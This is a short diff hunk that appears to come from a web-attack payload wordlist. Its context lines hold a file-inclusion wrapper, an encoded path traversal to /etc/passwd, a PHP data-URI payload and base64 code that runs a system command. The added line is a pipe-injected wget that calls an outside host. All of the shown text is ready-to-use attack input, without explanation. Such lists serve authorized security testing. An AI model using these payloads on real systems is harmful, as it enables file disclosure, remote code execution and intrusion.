@@ -65,3 +65,4 @@ expect://ls
 %252e%252e%252fetc%252fpasswd%00
 data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
 c3lzdGVtKCJ0b3VjaCAvdG1wL3JjZSIpOw==
+|wget http://myhost.name
